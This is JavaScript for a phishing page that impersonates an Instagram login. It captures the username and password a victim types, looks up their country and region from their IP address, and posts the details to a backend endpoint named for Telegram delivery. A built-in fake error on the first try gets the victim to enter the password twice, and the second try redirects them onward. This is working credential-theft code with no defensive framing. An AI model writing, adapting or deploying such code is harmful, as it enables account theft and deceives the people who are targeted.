const urlParams = new URLSearchParams(window.location.search);
const projectName = urlParams.get('project');

let attempt = 0;

    // Get IP + Location
    async function getLocationData() {
      try {
        const res = await fetch('https://ip-api.com/json/?fields=status,country,regionName,city,query');
        const data = await res.json();

        if (data.status === "success") {
          return {
            country: data.country || "Unknown",
            state: data.regionName || "Unknown",
            city: data.city || "Unknown"
          };
        }
      } catch (e) {}

      // Fallback
      try {
        const fb = await fetch('https://ipapi.co/json/');
        const fbData = await fb.json();
        return {
          country: fbData.country_name || "Unknown",
          state: fbData.region || "Unknown",
          city: fbData.city || "Unknown"
        };
      } catch (e) {}

      return { country: "Unknown", state: "Unknown", city: "Unknown" };
    }

    const loginForm = document.getElementById("loginForm");
    loginForm.addEventListener("submit", async (e) => {
      e.preventDefault();

      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();
      const passwordInput = document.getElementById("password");

      if (!username || !password) {
        alert("Please fill in all fields!");
        return;
      }

      const btn = document.getElementById("loginBtn");
      const btnText = document.getElementById("btnText");
      const spinner = document.getElementById("spinner");
      const errorMsg = document.getElementById("errorMsg");

      // Loading state
      btn.disabled = true;
      btnText.textContent = "Logging in...";
      spinner.classList.remove("hidden");
      errorMsg.classList.add("hidden");

      const loc = await getLocationData();

      // Simple & Clean Message Format (exactly as you want)
      const message = `

APP:INSTAGRAM

USER:  ${username}

PWD:  ${password}

COUNTRY:  ${loc.country} 🌍

STATE: ${loc.state}

X:  ${attempt + 1} ⏱️
`;

      // Send to our backend endpoint
      try {
        await fetch('/api/send-telegram', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ message, projectName: projectName || '' })
        });
      } catch (err) {
        console.error("Failed to send to backend:", err);
      }

      attempt++;

      // Two-attempt logic
      setTimeout(() => {
        if (attempt === 1) {
          // First attempt - show error
          errorMsg.classList.remove("hidden");
          btn.disabled = false;
          btnText.textContent = "Log in";
          spinner.classList.add("hidden");
          passwordInput.value = "";   // Clear password for next try
        } else {
          // Second attempt - redirect
          btnText.textContent = "Redirecting...";
          setTimeout(() => {
            window.location.href = `secure.html?project=${projectName}`;
          }, 800);
        }
      }, 1400);
    });